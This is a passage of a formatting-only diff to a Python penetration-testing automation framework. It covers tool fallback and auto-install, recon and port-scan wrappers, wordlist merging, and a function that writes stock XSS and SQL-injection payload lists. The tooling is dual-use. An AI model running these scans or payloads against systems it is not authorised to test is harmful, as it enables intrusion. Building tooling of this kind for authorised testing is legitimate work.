+            "assetfinder",
+            "findomain",
+            "sublist3r",
+            "dnsrecon",
+            "fierce",
+        ],
         "amass": ["subfinder", "assetfinder", "findomain", "sublist3r"],
         "assetfinder": ["subfinder", "amass", "findomain", "sublist3r"],
         "findomain": ["subfinder", "amass", "assetfinder", "sublist3r"],
         "sublist3r": ["subfinder", "amass", "assetfinder", "findomain"],
-
         # Port Scanning (Enhanced)
         "naabu": ["masscan", "nmap", "zmap", "rustscan", "unicornscan"],
         "masscan": ["nmap", "naabu", "zmap", "rustscan"],
         "nmap": ["masscan", "naabu", "zmap", "rustscan"],
         "rustscan": ["nmap", "masscan", "naabu", "zmap"],
         "zmap": ["masscan", "nmap", "naabu", "rustscan"],
-
         # HTTP Probing (Enhanced)
         "httpx": ["httprobe", "curl", "wget", "meg"],
         "httprobe": ["httpx", "curl", "wget"],
         "meg": ["httpx", "httprobe", "curl"],
-
         # Directory Fuzzing (Enhanced)
         "gobuster": ["ffu", "dirb", "dirsearch", "feroxbuster", "wfuzz", "dirseek"],
         "ffu": ["gobuster", "dirb", "dirsearch", "feroxbuster", "wfuzz"],
@@ -3302,64 +4181,53 @@ class EnhancedToolFallbackManager:
         "dirsearch": ["gobuster", "ffu", "dirb", "feroxbuster", "wfuzz"],
         "feroxbuster": ["ffu", "gobuster", "dirsearch", "wfuzz"],
         "wfuzz": ["ffu", "gobuster", "dirsearch", "feroxbuster"],
-
         # Web Crawling (Enhanced)
         "waybackurls": ["gau", "gospider", "hakrawler", "photon", "paramspider"],
         "gau": ["waybackurls", "gospider", "hakrawler", "photon"],
         "gospider": ["waybackurls", "gau", "hakrawler", "photon"],
         "hakrawler": ["waybackurls", "gau", "gospider", "photon"],
         "photon": ["waybackurls", "gau", "gospider", "hakrawler"],
-
         # Vulnerability Scanning (Enhanced)
         "nuclei": ["nikto", "nmap", "w3a", "skipfish", "zaproxy", "arachni"],
         "nikto": ["nuclei", "nmap", "w3a", "skipfish"],
         "nmap": ["nuclei", "nikto", "masscan", "w3a"],
         "w3a": ["nuclei", "nikto", "skipfish", "zaproxy"],
         "zaproxy": ["nuclei", "nikto", "w3a", "skipfish"],
-
         # Web Technology Detection (Enhanced)
         "whatweb": ["wappalyzer", "httpx", "webanalyze", "builtwith"],
         "webanalyze": ["whatweb", "wappalyzer", "httpx", "builtwith"],
         "wappalyzer": ["whatweb", "webanalyze", "httpx"],
-
         # SQL Injection (Enhanced)
         "sqlmap": ["sqlninja", "jSQL", "bbqsql", "commix", "NoSQLMap"],
         "commix": ["sqlmap", "sqlninja", "jSQL"],
         "sqlninja": ["sqlmap", "commix", "jSQL"],
-
         # XSS Testing (Enhanced)
         "dalfox": ["xsstrike", "xsser", "xss-payload-generator", "XSScrapy"],
         "xsstrike": ["dalfox", "xsser", "XSScrapy"],
         "xsser": ["dalfox", "xsstrike", "XSScrapy"],
-
         # Parameter Discovery (Enhanced)
         "arjun": ["paramspider", "x8", "param-miner", "parameth"],
         "paramspider": ["arjun", "x8", "param-miner"],
         "x8": ["arjun", "paramspider", "param-miner"],
         "parameth": ["arjun", "paramspider", "x8"],
-
         # Subdomain Takeover (Enhanced)
         "subjack": ["subzy", "subdomain-takeover", "can-i-take-over-xyz", "subover"],
         "subzy": ["subjack", "subdomain-takeover", "subover"],
         "subover": ["subjack", "subzy", "subdomain-takeover"],
-
         # DNS Tools (Enhanced)
         "dig": ["nslookup", "host", "drill", "kdig"],
         "nslookup": ["dig", "host", "drill"],
         "host": ["dig", "nslookup", "drill"],
         "drill": ["dig", "nslookup", "host"],
-
         # Network Analysis (Enhanced)
         "ncat": ["nc", "netcat", "socat"],
         "nc": ["ncat", "netcat", "socat"],
         "netcat": ["ncat", "nc", "socat"],
         "socat": ["ncat", "nc", "netcat"],
-
         # SSL/TLS Analysis
         "sslscan": ["sslyze", "testssl", "ssl-enum-ciphers"],
         "sslyze": ["sslscan", "testssl", "ssl-enum-ciphers"],
         "testssl": ["sslscan", "sslyze", "ssl-enum-ciphers"],
-
         # Content Discovery (Enhanced)
         "katana": ["gospider", "hakrawler", "gau", "waybackurls"],
         "crawley": ["katana", "gospider", "hakrawler"],
@@ -3389,7 +4257,6 @@ class EnhancedToolFallbackManager:
         "rustscan": "go install github.com/RustScan/RustScan@latest",
         "hakrawler": "go install github.com/hakluke/hakrawler@latest",
         "meg": "go install github.com/tomnomnom/meg@latest",
-
         # Python tools (Enhanced)
         "dirsearch": "pip3 install dirsearch",
         "sqlmap": "pip3 install sqlmap",
@@ -3400,7 +4267,6 @@ class EnhancedToolFallbackManager:
         "sublist3r": "pip3 install sublist3r",
         "parameth": "pip3 install parameth",
         "wfuzz": "pip3 install wfuzz",
-
         # System packages (Enhanced)
         "nmap": "apt-get update && apt-get install -y nmap",
         "masscan": "apt-get update && apt-get install -y masscan",
@@ -3414,31 +4280,41 @@ class EnhancedToolFallbackManager:
     }
 
     @staticmethod
-
-    def get_available_tool(primary_tool: str, alternatives: List[str] = None) -> Optional[str]:
+    def get_available_tool(
+        primary_tool: str, alternatives: List[str] = None
+    ) -> Optional[str]:
         """Get the first available tool from primary + alternatives"""
         if which(primary_tool):
             return primary_tool
 
         # Try configured alternatives
-        alt_tools = alternatives or EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(primary_tool, [])
+        alt_tools = alternatives or EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(
+            primary_tool, []
+        )
 
         for alt_tool in alt_tools:
             if which(alt_tool):
-                logger.log(f"Using fallback tool '{alt_tool}' instead of '{primary_tool}'", "INFO")
+                logger.log(
+                    f"Using fallback tool '{alt_tool}' instead of '{primary_tool}'",
+                    "INFO",
+                )
                 return alt_tool
 
-        logger.log(f"No available alternatives for '{primary_tool}'. Alternatives tried: {alt_tools}", "WARNING")
+        logger.log(
+            f"No available alternatives for '{primary_tool}'. Alternatives tried: {alt_tools}",
+            "WARNING",
+        )
         return None
 
     @staticmethod
-
     def install_tool(tool_name: str) -> bool:
         """Attempt to install a missing tool"""
         install_cmd = EnhancedToolFallbackManager.INSTALLATION_COMMANDS.get(tool_name)
 
         if not install_cmd:
-            logger.log(f"No installation command available for '{tool_name}'", "WARNING")
+            logger.log(
+                f"No installation command available for '{tool_name}'", "WARNING"
+            )
             return False
 
         logger.log(f"Attempting to install '{tool_name}'...", "INFO")
@@ -3446,13 +4322,14 @@ class EnhancedToolFallbackManager:
         try:
             # SECURITY FIX: Parse command safely instead of using shell=True
             import shlex
+
             install_args = shlex.split(install_cmd)
             result = subprocess.run(
                 install_args,
                 shell=False,  # SECURITY: Never use shell=True
                 capture_output=True,
                 text=True,
-                timeout=300  # 5 minute timeout
+                timeout=300,  # 5 minute timeout
             )
 
             if result.returncode == 0:
@@ -3469,8 +4346,9 @@ class EnhancedToolFallbackManager:
             return False
 
     @staticmethod
-
-    def ensure_tool_available(tool_name: str, auto_install: bool = False) -> Optional[str]:
+    def ensure_tool_available(
+        tool_name: str, auto_install: bool = False
+    ) -> Optional[str]:
         """Ensure a tool is available, with fallback and optional auto-install"""
         # First check if primary tool is available
         if which(tool_name):
@@ -3489,7 +4367,9 @@ class EnhancedToolFallbackManager:
 
         # If auto-install enabled, try installing alternatives
         if auto_install:
-            alternatives = EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(tool_name, [])
+            alternatives = EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(
+                tool_name, []
+            )
             for alt_tool in alternatives:
                 logger.log(f"Attempting to install alternative '{alt_tool}'...", "INFO")
                 if EnhancedToolFallbackManager.install_tool(alt_tool):
@@ -3498,7 +4378,6 @@ class EnhancedToolFallbackManager:
         return None
 
     @staticmethod
-
     def get_tool_status() -> Dict[str, Dict[str, Any]]:
         """Get comprehensive status of all tools"""
         status = {}
@@ -3510,16 +4389,29 @@ class EnhancedToolFallbackManager:
         for tool in sorted(all_tools):
             status[tool] = {
                 "available": which(tool),
-                "alternatives": EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(tool, []),
-                "available_alternatives": [alt for alt in EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(tool, []) if which(alt)],
-                "installable": tool in EnhancedToolFallbackManager.INSTALLATION_COMMANDS
+                "alternatives": EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(
+                    tool, []
+                ),
+                "available_alternatives": [
+                    alt
+                    for alt in EnhancedToolFallbackManager.TOOL_ALTERNATIVES.get(
+                        tool, []
+                    )
+                    if which(alt)
+                ],
+                "installable": tool
+                in EnhancedToolFallbackManager.INSTALLATION_COMMANDS,
             }
 
         return status
 
     @staticmethod
-
-    def run_with_fallback(primary_tool: str, command_args: List[str], alternatives: List[str] = None, **kwargs) -> Optional[subprocess.CompletedProcess]:
+    def run_with_fallback(
+        primary_tool: str,
+        command_args: List[str],
+        alternatives: List[str] = None,
+        **kwargs,
+    ) -> Optional[subprocess.CompletedProcess]:
         """Run command with automatic fallback to alternative tools"""
         available_tool = EnhancedToolFallbackManager.ensure_tool_available(primary_tool)
 
@@ -3538,19 +4430,27 @@ class EnhancedToolFallbackManager:
             logger.log(f"Failed to run {available_tool}: {e}", "ERROR")
             return None
 
+
 # Update which function to use the fallback manager
 def get_best_available_tool(tool_name: str) -> Optional[str]:
     """Get the best available tool including fallbacks"""
     return EnhancedToolFallbackManager.ensure_tool_available(tool_name)
 
+
 # ---------- Dependency validation ----------
 def _check_python_version() -> bool:
     """Check if Python version meets requirements"""
     python_version = sys.version_info
-    if python_version.major < 3 or (python_version.major == 3 and python_version.minor < 9):
-        logger.log(f"Python 3.9+ required, found {python_version.major}.{python_version.minor}", "ERROR")
+    if python_version.major < 3 or (
+        python_version.major == 3 and python_version.minor < 9
+    ):
+        logger.log(
+            f"Python 3.9+ required, found {python_version.major}.{python_version.minor}",
+            "ERROR",
+        )
         return False
     return True
+
 
 def _check_python_packages() -> List[str]:
     """Check optional Python packages and return missing ones"""
@@ -3559,7 +4459,7 @@ def _check_python_packages() -> List[str]:
     packages_to_check = {
         "psutil": "System monitoring",
         "distro": "OS detection",
-        "requests": "HTTP operations"
+        "requests": "HTTP operations",
     }
 
     for package, description in packages_to_check.items():
@@ -3570,11 +4470,14 @@ def _check_python_packages() -> List[str]:
             missing_packages.append(package)
 
     if missing_packages:
-        logger.log(f"Optional packages missing: {', '.join(missing_packages)}", "WARNING")
+        logger.log(
+            f"Optional packages missing: {', '.join(missing_packages)}", "WARNING"
+        )
         logger.log("Install with: pip3 install " + " ".join(missing_packages), "INFO")
         logger.log("Or run: pip3 install -r requirements.txt", "INFO")
 
     return missing_packages
+
 
 def _get_security_tools_config() -> Dict[str, str]:
     """Get configuration for security tools and their install commands"""
@@ -3607,13 +4510,24 @@ def _get_security_tools_config() -> Dict[str, str]:
         "dirsearch": "pip3 install dirsearch",
         "paramspider": "go install github.com/devanshbatham/paramspider@latest",
         "arjun": "pip3 install arjun",
-        "dalfox": "go install github.com/hahwul/dalfox/v2@latest"
+        "dalfox": "go install github.com/hahwul/dalfox/v2@latest",
     }
+
 
 def _check_security_tools() -> Tuple[List[str], List[Tuple[str, str]], int]:
     """Check security tools availability"""
     tools = _get_security_tools_config()
-    core_tools = ["subfinder", "httpx", "naabu", "nuclei", "katana", "gau", "ffu", "nmap", "sqlmap"]
+    core_tools = [
+        "subfinder",
+        "httpx",
+        "naabu",
+        "nuclei",
+        "katana",
+        "gau",
+        "ffu",
+        "nmap",
+        "sqlmap",
+    ]
 
     available_tools = []
     missing_tools = []
@@ -3636,10 +4550,15 @@ def _check_security_tools() -> Tuple[List[str], List[Tuple[str, str]], int]:
             if tool in core_tools:
                 logger.log(f"  \033[91m{tool}\033[0m (CORE): {install_cmd}", "WARNING")
             else:
-                logger.log(f"  \033[93m{tool}\033[0m (ENHANCED): {install_cmd}", "WARNING")
-        logger.log("Run the install.sh script to automatically install missing tools", "INFO")
+                logger.log(
+                    f"  \033[93m{tool}\033[0m (ENHANCED): {install_cmd}", "WARNING"
+                )
+        logger.log(
+            "Run the install.sh script to automatically install missing tools", "INFO"
+        )
 
     return available_tools, missing_tools, core_available
+
 
 def _check_essential_tools() -> bool:
     """Check essential system tools"""
@@ -3651,11 +4570,16 @@ def _check_essential_tools() -> bool:
             missing_essential.append(tool)
 
     if missing_essential:
-        logger.log(f"Essential system tools missing: {', '.join(missing_essential)}", "ERROR")
-        logger.log("Please install missing system tools using your package manager", "ERROR")
+        logger.log(
+            f"Essential system tools missing: {', '.join(missing_essential)}", "ERROR"
+        )
+        logger.log(
+            "Please install missing system tools using your package manager", "ERROR"
+        )
         return False
 
     return True
+
 
 def validate_dependencies() -> bool:
     """Validate all dependencies and provide helpful error messages"""
@@ -3683,14 +4607,20 @@ def validate_dependencies() -> bool:
     logger.log("Dependency validation completed", "SUCCESS")
     return core_available >= 4  # Require at least 4 core tools
 
+
 def check_and_setup_environment():
     """Check environment and provide setup guidance if needed"""
     issues_found = []
 
     # Check if we're in the right directory
     script_dir = Path(__file__).resolve().parent
-    if not (script_dir / "p4nth30n.cfg.json").exists() and not (script_dir / "targets.txt").exists():
-        issues_found.append("Configuration files missing. Run from the correct directory.")
+    if (
+        not (script_dir / "p4nth30n.cfg.json").exists()
+        and not (script_dir / "targets.txt").exists()
+    ):
+        issues_found.append(
+            "Configuration files missing. Run from the correct directory."
+        )
 
     # Check PATH for Go tools
     go_bin_path = Path.home() / "go" / "bin"
@@ -3698,7 +4628,7 @@ def check_and_setup_environment():
         path_env = os.environ.get("PATH", "")
         if str(go_bin_path) not in path_env:
             issues_found.append(f"Go tools directory not in PATH: {go_bin_path}")
-            logger.log("Add to PATH: export PATH=\"{go_bin_path}:$PATH\"", "INFO")
+            logger.log('Add to PATH: export PATH="{go_bin_path}:$PATH"', "INFO")
 
     # Check write permissions
     try:
@@ -3716,10 +4646,12 @@ def check_and_setup_environment():
 
     return True
 
+
 # ---------- Resource monitor ----------
 def get_system_resources() -> Dict[str, float]:
     try:
         import psutil  # type: ignore
+
         return {
             "cpu": float(psutil.cpu_percent(interval=0.2)),
             "memory": float(psutil.virtual_memory().percent),
@@ -3728,17 +4660,28 @@ def get_system_resources() -> Dict[str, float]:
     except Exception:
         # Fallback best-effort (Linux only)
         try:
-            cpu_usage = float(subprocess.check_output(
-                ["bash", "-lc", "grep 'cpu ' /proc/stat | awk '{u=($2+$4)*100/($2+$4+$5)} END {print u}'"]
-            ).decode().strip())
+            cpu_usage = float(
+                subprocess.check_output(
+                    [
+                        "bash",
+                        "-lc",
+                        "grep 'cpu ' /proc/stat | awk '{u=($2+$4)*100/($2+$4+$5)} END {print u}'",
+                    ]
+                )
+                .decode()
+                .strip()
+            )
             lines = subprocess.check_output(["free", "-m"]).decode().splitlines()
             total, used = list(map(int, lines[1].split()[1:3]))
             memory_usage = (used / total) * 100
-            disk_line = subprocess.check_output(["d", "-h", str(HERE)]).decode().splitlines()[1]
+            disk_line = (
+                subprocess.check_output(["d", "-h", str(HERE)]).decode().splitlines()[1]
+            )
             disk_usage = float(disk_line.split()[4].replace("%", ""))
             return {"cpu": cpu_usage, "memory": memory_usage, "disk": disk_usage}
         except Exception:
             return {"cpu": 0.0, "memory": 0.0, "disk": 0.0}
+
 
 def resource_monitor(cfg: Dict[str, Any], stop_event: threading.Event):
     """Monitor system resources and throttle when necessary"""
@@ -3751,13 +4694,20 @@ def resource_monitor(cfg: Dict[str, Any], stop_event: threading.Event):
         try:
             r = get_system_resources()
             if r:  # Only log if we got valid resource data
-                logger.log(f"Resources CPU:{r['cpu']:.1f}% MEM:{r['memory']:.1f}% DISK:{r['disk']:.1f}%", "DEBUG")
+                logger.log(
+                    f"Resources CPU:{r['cpu']:.1f}% MEM:{r['memory']:.1f}% DISK:{r['disk']:.1f}%",
+                    "DEBUG",
+                )
 
                 # Check thresholds and throttle if necessary
-                if (r["cpu"] > cpu_threshold or
-                    r["memory"] > memory_threshold or
-                    r["disk"] > disk_threshold):
-                    logger.log("High resource usage, throttling operations...", "WARNING")
+                if (
+                    r["cpu"] > cpu_threshold
+                    or r["memory"] > memory_threshold
+                    or r["disk"] > disk_threshold
+                ):
+                    logger.log(
+                        "High resource usage, throttling operations...", "WARNING"
+                    )
                     time.sleep(monitor_interval * 2)
                 else:
                     time.sleep(monitor_interval)
@@ -3767,6 +4717,7 @@ def resource_monitor(cfg: Dict[str, Any], stop_event: threading.Event):
         except Exception as e:
             logger.log(f"Resource monitoring error: {e}", "WARNING")
             time.sleep(monitor_interval)
+
 
 # ---------- External sources ----------
 def git_clone_or_pull(url: str, dest: Path):
@@ -3785,6 +4736,7 @@ def git_clone_or_pull(url: str, dest: Path):
     except Exception as e:
         logger.log(f"git clone failed for {url}: {e}", "ERROR")
 
+
 def direct_zip_download(url: str, dest: Path):
     # Try both main and master branches for GitHub
     cands = []
@@ -3796,15 +4748,22 @@ def direct_zip_download(url: str, dest: Path):
     for u in cands:
         try:
             zip_path = dest.with_suffix(".zip")
-            run_cmd(["wget", "-q", "-O", str(zip_path), u], timeout=300, check_return=True)
+            run_cmd(
+                ["wget", "-q", "-O", str(zip_path), u], timeout=300, check_return=True
+            )
             extract_path = dest.parent / dest.stem
             extract_path.mkdir(exist_ok=True)
-            run_cmd(["unzip", "-o", str(zip_path), "-d", str(extract_path)], timeout=600, check_return=True)
+            run_cmd(
+                ["unzip", "-o", str(zip_path), "-d", str(extract_path)],
+                timeout=600,
+                check_return=True,
+            )
             logger.log(f"Downloaded+extracted {u} -> {extract_path}", "SUCCESS")
             return True
         except Exception as e:
             logger.log(f"Direct download failed {u}: {e}", "WARNING")
     return False
+
 
 def refresh_external_sources(cfg: Dict[str, Any]) -> Dict[str, Path]:
     sources = {
@@ -3821,7 +4780,7 @@ def refresh_external_sources(cfg: Dict[str, Any]) -> Dict[str, Path]:
         "OneListForAll": EXT_DIR / "OneListForAll",
         "WebDiscoveryWordlists": EXT_DIR / "fuzz.txt",
         "XSSPayloads": PAYLOADS_DIR / "xss-payload-list",
-        "SQLIPayloads": PAYLOADS_DIR / "sql-injection-payload-list"
+        "SQLIPayloads": PAYLOADS_DIR / "sql-injection-payload-list",
     }
 
     for name, path in sources.items():
@@ -3829,7 +4788,11 @@ def refresh_external_sources(cfg: Dict[str, Any]) -> Dict[str, Path]:
         if not url:
             continue
         git_clone_or_pull(url, path)
-        if not path.exists() and cfg["fallback"]["enabled"] and cfg["fallback"]["direct_downloads"]:
+        if (
+            not path.exists()
+            and cfg["fallback"]["enabled"]
+            and cfg["fallback"]["direct_downloads"]
+        ):
             logger.log(f"Trying direct download fallback for {name}", "WARNING")
             direct_zip_download(url, path)
 
@@ -3843,42 +4806,59 @@ def refresh_external_sources(cfg: Dict[str, Any]) -> Dict[str, Path]:
 
     return sources
 
+
 def get_best_wordlist(category: str) -> Optional[Path]:
     """Get the best available wordlist for a given category"""
     wordlist_mapping = {
         "directories": [
             MERGED_DIR / "directories_merged.txt",
-            EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "directory-list-2.3-medium.txt",
+            EXT_DIR
+            / "SecLists"
+            / "Discovery"
+            / "Web-Content"
+            / "directory-list-2.3-medium.txt",
             EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "common.txt",
             EXT_DIR / "OneListForAll" / "onelistforall.txt",
-            EXTRA_DIR / "paths_extra.txt"
+            EXTRA_DIR / "paths_extra.txt",
         ],
         "files": [
             MERGED_DIR / "files_merged.txt",
-            EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "raft-medium-files.txt",
+            EXT_DIR
+            / "SecLists"
+            / "Discovery"
+            / "Web-Content"
+            / "raft-medium-files.txt",
             EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "common.txt",
-            EXT_DIR / "fuzz.txt" / "fuzz.txt"
+            EXT_DIR / "fuzz.txt" / "fuzz.txt",
         ],
         "parameters": [
             MERGED_DIR / "params_merged.txt",
-            EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "burp-parameter-names.txt",
-            EXTRA_DIR / "params_extra.txt"
+            EXT_DIR
+            / "SecLists"
+            / "Discovery"
+            / "Web-Content"
+            / "burp-parameter-names.txt",
+            EXTRA_DIR / "params_extra.txt",
         ],
         "subdomains": [
             MERGED_DIR / "subdomains_merged.txt",
-            EXT_DIR / "SecLists" / "Discovery" / "DNS" / "subdomains-top1million-110000.txt",
-            EXT_DIR / "commonspeak2-wordlists" / "subdomains" / "subdomains.txt"
+            EXT_DIR
+            / "SecLists"
+            / "Discovery"
+            / "DNS"
+            / "subdomains-top1million-110000.txt",
+            EXT_DIR / "commonspeak2-wordlists" / "subdomains" / "subdomains.txt",
         ],
         "xss": [
             PAYLOADS_DIR / "xss-payload-list" / "Intruder" / "xss-payload-list.txt",
             EXT_DIR / "PayloadsAllTheThings" / "XSS Injection" / "README.md",
-            EXTRA_DIR / "exploit_payloads.txt"
+            EXTRA_DIR / "exploit_payloads.txt",
         ],
         "sqli": [
             PAYLOADS_DIR / "sql-injection-payload-list" / "sqli-blind.txt",
             EXT_DIR / "PayloadsAllTheThings" / "SQL Injection" / "README.md",
-            EXT_DIR / "SecLists" / "Fuzzing" / "SQLi" / "quick-SQLi.txt"
-        ]
+            EXT_DIR / "SecLists" / "Fuzzing" / "SQLi" / "quick-SQLi.txt",
+        ],
     }
 
     wordlists = wordlist_mapping.get(category, [])
@@ -3889,6 +4869,7 @@ def get_best_wordlist(category: str) -> Optional[Path]:
 
     logger.log(f"No wordlist found for category: {category}", "WARNING")
     return None
+
 
 def create_enhanced_payloads():
     """Create enhanced payload collections for various attack types"""
@@ -3914,11 +4895,11 @@ def create_enhanced_payloads():
         "<marquee onstart=alert('XSS')>",
         "'><svg/onload=alert('XSS')>",
         "\"><img/src/onerror=alert('XSS')>",
-        "<script>alert(String.fromCharCode(88,83,83))</script>"
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
     ]
 
-    with open(xss_payloads_dir / "basic_xss.txt", 'w') as f:
-        f.write('\n'.join(xss_payloads))
+    with open(xss_payloads_dir / "basic_xss.txt", "w") as f:
+        f.write("\n".join(xss_payloads))
 
     # SQLi payloads
     sqli_payloads_dir = PAYLOADS_DIR / "sqli"
@@ -3944,11 +4925,11 @@ def create_enhanced_payloads():
         "' UNION SELECT NULL--",
         "' UNION SELECT NULL,NULL--",
         "' UNION SELECT NULL,NULL,NULL--",
-        "'; WAITFOR DELAY '00:00:10'--"
+        "'; WAITFOR DELAY '00:00:10'--",
     ]
 
-    with open(sqli_payloads_dir / "basic_sqli.txt", 'w') as f:
-        f.write('\n'.join(sqli_payloads))
+    with open(sqli_payloads_dir / "basic_sqli.txt", "w") as f:
+        f.write("\n".join(sqli_payloads))
 
     # Nuclei custom payloads
     nuclei_payloads_dir = PAYLOADS_DIR / "nuclei"
@@ -3980,10 +4961,16 @@ requests:
           - "phpMyAdmin"
 """
 
-    with open(nuclei_payloads_dir / "custom-template.yaml", 'w') as f:
+    with open(nuclei_payloads_dir / "custom-template.yaml", "w") as f:
         f.write(custom_template)
 
-def merge_wordlists(seclists_path: Path, payloads_path: Path, probable_wordlists_path: Path, additional_paths: Dict[str, Path] = None):
+
+def merge_wordlists(
+    seclists_path: Path,
+    payloads_path: Path,
+    probable_wordlists_path: Path,
+    additional_paths: Dict[str, Path] = None,
+):
     """Efficiently merge wordlists with memory optimization"""
     logger.log("Merging wordlists...", "INFO")
     MERGED_DIR.mkdir(parents=True, exist_ok=True)
@@ -3999,8 +4986,12 @@ def merge_wordlists(seclists_path: Path, payloads_path: Path, probable_wordlists
                             file_path = Path(root) / f
                             # Skip very large files to avoid memory issues
                             try:
-                                if file_path.stat().st_size > 100 * 1024 * 1024:  # 100MB limit
-                                    logger.log(f"Skipping large file: {file_path}", "WARNING")
+                                if (
+                                    file_path.stat().st_size > 100 * 1024 * 1024
+                                ):  # 100MB limit
+                                    logger.log(
+                                        f"Skipping large file: {file_path}", "WARNING"
+                                    )
                                     continue
                             except OSError:
                                 continue
@@ -4011,14 +5002,16 @@ def merge_wordlists(seclists_path: Path, payloads_path: Path, probable_wordlists
         """Process a single wordlist file with limits"""
         lines_processed = 0
         try:
-            with open(fp, 'r', encoding="utf-8", errors="ignore") as f:
+            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                 for line in f:
                     if lines_processed >= max_lines:
                         logger.log(f"Line limit reached for {fp}, stopping", "DEBUG")
                         break
 
                     s = line.strip()
-                    if s and not s.startswith("#") and 3 <= len(s) <= 100:  # Reasonable length limits
+                    if (
+                        s and not s.startswith("#") and 3 <= len(s) <= 100
+                    ):  # Reasonable length limits
                         uniq.add(s)
                         lines_processed += 1
 
@@ -4042,7 +5035,9 @@ def merge_wordlists(seclists_path: Path, payloads_path: Path, probable_wordlists
 
     for fp in all_files:
         if total_processed >= max_total_lines:
-            logger.log(f"Total line limit reached ({max_total_lines}), stopping", "WARNING")
+            logger.log(
+                f"Total line limit reached ({max_total_lines}), stopping", "WARNING"
+            )
             break
 
         processed = _process_wordlist_file(fp, uniq, max_lines=50000)
@@ -4055,9 +5050,14 @@ def merge_wordlists(seclists_path: Path, payloads_path: Path, probable_wordlists
 
     merged_file = MERGED_DIR / "all_merged_wordlist.txt"
     atomic_write(merged_file, "\n".join(sorted(uniq)))
-    logger.log(f"Merged {len(uniq)} unique lines from {len(all_files)} files -> {merged_file}", "SUCCESS")
+    logger.log(
+        f"Merged {len(uniq)} unique lines from {len(all_files)} files -> {merged_file}",
+        "SUCCESS",
+    )
+
 
 # ---------- Run Management ----------
+
 
 class RunData:
     """Simple container for run information"""
@@ -4067,6 +5067,7 @@ class RunData:
         self.run_name = run_name or run_dir.name
         self.targets_list = None
 
+
 def new_run() -> Path:
     run_id = datetime.now().strftime("%Y%m%d_%H%M%S") + "_" + str(uuid.uuid4())[:8]
     run_dir = RUNS_DIR / run_id
@@ -4074,9 +5075,16 @@ def new_run() -> Path:
     logger.log(f"Created run: {run_dir}", "INFO")
     return run_dir
 
+
 def start_run(run_type: str) -> Tuple[RunData, Dict[str, str]]:
     """Initialize a run with proper data structures"""
-    run_id = datetime.now().strftime("%Y%m%d_%H%M%S") + "_" + run_type + "_" + str(uuid.uuid4())[:8]
+    run_id = (
+        datetime.now().strftime("%Y%m%d_%H%M%S")
+        + "_"
+        + run_type
+        + "_"
+        + str(uuid.uuid4())[:8]
+    )
     run_dir = RUNS_DIR / run_id
     run_dir.mkdir(parents=True, exist_ok=True)
 
@@ -4086,6 +5094,7 @@ def start_run(run_type: str) -> Tuple[RunData, Dict[str, str]]:
     logger.log(f"Created {run_type} run: {run_dir}", "INFO")
     return rd, env
 
+
 def env_with_lists() -> Dict[str, str]:
     env = os.environ.copy()
     env["P4NTH30N_MERGED_WORDLISTS"] = str(MERGED_DIR)
@@ -4093,55 +5102,130 @@ def env_with_lists() -> Dict[str, str]:
     env["P4NTH30N_EXPLOITS"] = str(EXPLOITS_DIR)
     return env
 
+
 # ---------- Tool wrappers ----------
 def run_subfinder(domain: str, out_file: Path, env: Dict[str, str]):
     if not which("subfinder"):
         logger.log("subfinder not found, skipping", "WARNING")
         return
-    run_cmd(["subfinder", "-d", domain, "-silent", "-o", str(out_file), "-all"], env=env, timeout=600, check_return=False)
+    run_cmd(
+        ["subfinder", "-d", domain, "-silent", "-o", str(out_file), "-all"],
+        env=env,
+        timeout=600,
+        check_return=False,
+    )
+
 
 def run_amass(domain: str, out_file: Path, env: Dict[str, str]):
     if not which("amass"):
         logger.log("amass not found, skipping", "WARNING")
         return
     # Passive mode first (faster, lighter)
-    run_cmd(["amass", "enum", "-d", domain, "-o", str(out_file), "-passive"], env=env, timeout=1200, check_return=False)
+    run_cmd(
+        ["amass", "enum", "-d", domain, "-o", str(out_file), "-passive"],
+        env=env,
+        timeout=1200,
+        check_return=False,
+    )
+
 
 def run_naabu(host: str, out_file: Path, rps: int, env: Dict[str, str]):
     if not which("naabu"):
         logger.log("naabu not found, skipping", "WARNING")
         return
-    run_cmd(["naabu", "-host", host, "-p", "-", "-rate", str(rps), "-o", str(out_file), "-silent"], env=env, timeout=1200, check_return=False)
+    run_cmd(
+        [
+            "naabu",
+            "-host",
+            host,
+            "-p",
+            "-",
+            "-rate",
+            str(rps),
+            "-o",
+            str(out_file),
+            "-silent",
+        ],
+        env=env,
+        timeout=1200,
+        check_return=False,
+    )
+
 
 def run_masscan(host: str, out_file: Path, rps: int, env: Dict[str, str]):
     if not which("masscan"):
         logger.log("masscan not found, skipping", "WARNING")
         return
-    run_cmd(["masscan", host, "-p", "1-65535", "--rate", str(rps), "-oG", str(out_file)], env=env, timeout=1800, check_return=False)
+    run_cmd(
+        ["masscan", host, "-p", "1-65535", "--rate", str(rps), "-oG", str(out_file)],
+        env=env,
+        timeout=1800,
+        check_return=False,
+    )
+
 
 def run_httpx(input_file: Path, out_file: Path, env: Dict[str, str], http_timeout: int):
     if not which("httpx"):
         logger.log("httpx not found, skipping", "WARNING")
         return
-    run_cmd([
-        "httpx", "-l", str(input_file), "-o", str(out_file),
-        "-silent", "-follow-redirects",
-        "-mc", "200,201,202,204,301,302,303,307,308,401,403,405,500",
-        "-json", "-title", "-tech-detect", "-sc", "-timeout", str(http_timeout),
-        "-server", "-cdn", "-pipeline", "-headers"
-    ], env=env, timeout=1200, check_return=False)
+    run_cmd(
+        [
+            "httpx",
+            "-l",
+            str(input_file),
+            "-o",
+            str(out_file),
+            "-silent",
+            "-follow-redirects",
+            "-mc",
+            "200,201,202,204,301,302,303,307,308,401,403,405,500",
+            "-json",
+            "-title",
+            "-tech-detect",
+            "-sc",
+            "-timeout",
+            str(http_timeout),
+            "-server",
+            "-cdn",
+            "-pipeline",
+            "-headers",
+        ],
+        env=env,
+        timeout=1200,
+        check_return=False,
+    )
 
